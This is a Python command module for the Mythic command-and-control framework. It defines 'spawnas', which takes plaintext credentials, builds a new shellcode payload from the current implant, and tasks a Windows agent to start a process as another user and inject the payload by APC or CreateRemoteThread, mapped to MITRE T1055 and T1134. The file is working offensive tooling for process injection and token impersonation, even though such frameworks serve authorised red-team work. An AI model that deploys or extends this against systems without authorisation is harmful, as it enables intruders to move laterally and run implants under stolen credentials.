from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class SpawnAsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                limit_credentials_by_type=["plaintext"],
                parameter_group_info=[ParameterGroupInfo(
                    group_name="credential_store",
                    required=True,
                    ui_position=1
                )]
            ),
            CommandParameter(
                name="username",
                cli_name="username",
                display_name="Username",
                type=ParameterType.String,
                description="Username for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="manual",
                    required=True,
                    ui_position=1
                )]
            ),
            CommandParameter(
                name="password",
                cli_name="password",
                display_name="Password",
                type=ParameterType.String,
                description="Password for authentication",
                parameter_group_info=[ParameterGroupInfo(
                    group_name="manual",
                    required=True,
                    ui_position=2
                )]
            ),
            CommandParameter(
                name="domain",
                cli_name="domain",
                display_name="Domain",
                type=ParameterType.String,
                description="Domain name (use '.' for local)",
                default_value=".",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", ui_position=2),
                    ParameterGroupInfo(group_name="manual", ui_position=3),
                ]
            ),
            CommandParameter(
                name="technique",
                cli_name="technique",
                display_name="Injection Technique",
                type=ParameterType.ChooseOne,
                default_value="apc",
                choices=["apc", "createremotethread"],
                description="Injection technique to use.",
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", required=True, ui_position=3),
                    ParameterGroupInfo(group_name="manual", required=True, ui_position=4),
                ]
            ),
            CommandParameter(
                name="netonly",
                cli_name="netonly",
                display_name="Network Only Logon",
                type=ParameterType.Boolean,
                description="Use LOGON_NETCREDENTIALS_ONLY (credentials for network access only)",
                default_value=False,
                parameter_group_info=[
                    ParameterGroupInfo(group_name="credential_store", ui_position=4),
                    ParameterGroupInfo(group_name="manual", ui_position=5),
                ]
            ),
        ]

    async def parse_arguments(self):
        self.load_args_from_json_string(self.command_line)
        if self.get_parameter_group_name() == "credential_store":
            credential = self.get_arg("credential")
            if credential:
                try:
                    cred_data = json.loads(credential)
                    self.add_arg("username", cred_data.get("account", ""))
                    self.add_arg("password", cred_data.get("credential", ""))
                    if "realm" in cred_data and cred_data["realm"]:
                        self.add_arg("domain", cred_data["realm"])
                except Exception as e:
                    raise ValueError(f"Failed to parse credential JSON: {e}")


class SpawnAsCommand(CommandBase):
    cmd = "spawnas"
    needs_admin = False
    help_cmd = "spawnas"
    description = "Spawn a new callback as another user. Creates a suspended process as the specified user using CreateProcessWithLogonW and injects the payload."
    version = 1
    author = "@haha150"
    argument_class = SpawnAsArguments
    attackmapping = ["T1055", "T1134"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        # Build a new shellcode payload from the current callback's registered payload
        build_resp = await SendMythicRPCPayloadCreateFromUUID(
            MythicRPCPayloadCreateFromUUIDMessage(
                TaskID=taskData.Task.ID,
                PayloadUUID=taskData.Callback.RegisteredPayloadUUID,
                NewDescription=f"SpawnAs payload - {taskData.Task.ID}",
                NewFilename="spawnas.bin",
            )
        )

        if not build_resp.Success:
            raise Exception(f"Failed to build spawnas payload: {build_resp.Error}")

        # Wait for the payload to finish building
        while True:
            import asyncio
            await asyncio.sleep(2)
            search_resp = await SendMythicRPCPayloadSearch(
                MythicRPCPayloadSearchMessage(
                    PayloadUUID=build_resp.NewPayloadUUID,
                )
            )
            if not search_resp.Success:
                raise Exception(f"Failed to search for payload: {search_resp.Error}")
            
            if len(search_resp.Payloads) == 0:
                raise Exception("Payload not found after creation")
            
            payload = search_resp.Payloads[0]
            if payload.BuildPhase == "success":
                file_resp = await SendMythicRPCFileSearch(
                    MythicRPCFileSearchMessage(
                        TaskID=taskData.Task.ID,
                        PayloadUUID=build_resp.NewPayloadUUID,
                    )
                )
                if not file_resp.Success or len(file_resp.Files) == 0:
                    raise Exception("Failed to find built payload file")
                
                taskData.args.add_arg("uuid", file_resp.Files[0].AgentFileId)
                break
            elif payload.BuildPhase == "error":
                raise Exception(f"Payload build failed: {payload.Error}")

        username = taskData.args.get_arg("username")
        domain = taskData.args.get_arg("domain")
        technique = taskData.args.get_arg("technique")
        response.DisplayParams = f"as {domain}\\{username} via {technique}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
